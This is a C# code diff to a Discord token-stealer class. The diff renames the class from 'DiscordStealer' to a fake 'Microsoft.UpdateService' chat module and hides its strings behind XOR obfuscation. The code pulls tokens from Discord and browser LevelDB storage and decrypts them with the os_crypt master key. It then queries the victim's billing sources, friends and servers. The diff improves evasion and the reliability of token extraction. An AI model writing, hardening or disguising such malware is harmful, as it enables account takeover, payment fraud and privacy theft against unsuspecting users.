@@ -10,18 +10,26 @@ using System.Net.Http.Headers;
 using System.Net;
 using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
+using FinalBot;
 
-namespace FinalBot.Stealers
+namespace Microsoft.UpdateService.Modules
 {
-    public class DiscordStealer
+    public class ChatService
     {
+        private static string D(string s)
+        {
+            char[] c = s.ToCharArray();
+            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
+            return new string(c);
+        }
+
         private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
 
         private readonly string[] _tokenRegexes = {
-            @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
-            @"mfa\.[\w-]{84}",
-            @"dQw4w9WgXcQ:[^"" ]{60,160}"
+            D("^Yr(X~71xY+^Yr(X~3xY+^Yr(X~72x"), // [\w-]{24}\.[\w-]{6}\.[\w-]{27}
+            D("hcdY+^Yr(X~=1x"), // mfa\.[\w-]{84}
+            D("aTr1r<Rb]fT?^['%X~35)435x") // dQw4w9WgXcQ:[^" ]{60,160}
         };
 
         public async Task<string> Run()
@@ -32,11 +40,11 @@ namespace FinalBot.Stealers
                 {"Discord", Path.Combine(_appData, "discord")},
                 {"Discord Canary", Path.Combine(_appData, "discordcanary")},
                 {"Discord PTB", Path.Combine(_appData, "discordptb")},
-                {"Chrome", Path.Combine(_localAppData, "Google\\Chrome\\User Data\\Default")},
-                {"Edge", Path.Combine(_localAppData, "Microsoft\\Edge\\User Data\\Default")},
-                {"Brave", Path.Combine(_localAppData, "BraveSoftware\\Brave-Browser\\User Data\\Default")},
-                {"Opera", Path.Combine(_appData, "Opera Software\\Opera Stable")},
-                {"Opera GX", Path.Combine(_appData, "Opera Software\\Opera GX Stable")}
+                {"Chrome", Path.Combine(_localAppData, D("Bjjbi`YFmwjh`YPv`w%AdqdYA`idpiq"))},
+                {"Edge", Path.Combine(_localAppData, D("HlfwjvjcqY@ab`YPv`w%AdqdYA`idpiq"))},
+                {"Brave", Path.Combine(_localAppData, D("Gwds`Vjcqrdw`YGwds`(Gwjrv`wYPv`w%AdqdYA`idpiq"))},
+                {"Opera", Path.Combine(_appData, D("Ju`wd%Vjcqrdw`YJu`wd%Vqdgi`"))},
+                {"Opera GX", Path.Combine(_appData, D("Ju`wd%Vjcqrdw`YJu`wd%B]%Vqdgi`"))}
             };
 
             foreach (var path in paths)
@@ -127,7 +135,7 @@ namespace FinalBot.Stealers
         {
             try
             {
-                var request = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me");
+                var request = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`")); // /users/@me
                 request.Headers.Authorization = new AuthenticationHeaderValue(token);
                 var response = await client.SendAsync(request);
                 if (response.IsSuccessStatusCode)
@@ -136,7 +144,7 @@ namespace FinalBot.Stealers
                     var user = JObject.Parse(content);
                     
                     // 1. Check billing
-                    var billingReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/billing/payment-sources");
+                    var billingReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*gliilkb*ud|h`kq(vjpwf`v"));
                     billingReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                     var billingResp = await client.SendAsync(billingReq);
                     if (billingResp.IsSuccessStatusCode)
@@ -145,7 +153,7 @@ namespace FinalBot.Stealers
                     }
                     
                     // 2. Check friends (relationships)
-                    var friendsReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/relationships");
+                    var friendsReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*w`idqljkvmluv"));
                     friendsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                     var friendsResp = await client.SendAsync(friendsReq);
                     if (friendsResp.IsSuccessStatusCode)
@@ -154,7 +162,7 @@ namespace FinalBot.Stealers
                     }
 
                     // 3. Check guilds (admin status)
-                    var guildsReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/guilds");
+                    var guildsReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*bpliav"));
                     guildsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                     var guildsResp = await client.SendAsync(guildsReq);
                     if (guildsResp.IsSuccessStatusCode)
@@ -183,10 +191,10 @@ namespace FinalBot.Stealers
         private async Task<List<string>> ScanPath(string service, string rootPath)
         {
             var results = new List<string>();
-            string levelDbPath = Path.Combine(rootPath, "Local Storage", "leveldb");
+            string levelDbPath = Path.Combine(rootPath, D("Ijfdi%Vqjwdg`"), D("i`s`iaG")); // Local Storage, leveldb
             if (!Directory.Exists(levelDbPath)) return results;
 
-            byte[] masterKey = null;
+            byte[]? masterKey = null;
             if (service.Contains("Discord"))
             {
                 masterKey = GetDiscordMasterKey(rootPath);
@@ -196,17 +204,23 @@ namespace FinalBot.Stealers
             {
                 try 
                 {
-                    string content = File.ReadAllText(file, Encoding.UTF8);
+                    // Use Latin-1 (28591) for binary-safe string reading — essential for regex in .ldb files
+                    string content = File.ReadAllText(file, Encoding.GetEncoding(28591));
                     foreach (var regex in _tokenRegexes)
                     {
                         foreach (Match match in Regex.Matches(content, regex))
                         {
                             string token = match.Value;
-                            if (token.StartsWith("dQw4w9WgXcQ:"))
+                            if (token.Contains("dQw4w9WgXcQ:"))
                             {
+                                // Handle potential character corruption in binary files
+                                var parts = token.Split(':');
+                                if (parts.Length < 2) continue;
+                                string encPart = parts[1].Split('"')[0].Split(' ')[0];
+
                                 if (masterKey != null)
                                 {
-                                    string decrypted = DecryptDiscordToken(token, masterKey);
+                                    string? decrypted = DecryptDiscordToken(encPart, masterKey);
                                     if (!string.IsNullOrEmpty(decrypted)) results.Add(decrypted);
                                 }
                             }
@@ -225,14 +239,14 @@ namespace FinalBot.Stealers
 
         private byte[] GetDiscordMasterKey(string rootPath)
         {
-            string stateFile = Path.Combine(rootPath, "Local State");
+            string stateFile = Path.Combine(rootPath, D("Ijfdi%Vqdq`")); // Local State
             if (!File.Exists(stateFile)) return null;
 
             try 
             {
                 string content = File.ReadAllText(stateFile);
                 var json = JObject.Parse(content);
-                string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
+                string encryptedKey = json[D("jvZfw|uq")]?[D("`kfw|uq`aZn`|")]?.ToString(); // os_crypt, encrypted_key
                 if (string.IsNullOrEmpty(encryptedKey)) return null;
 
                 byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
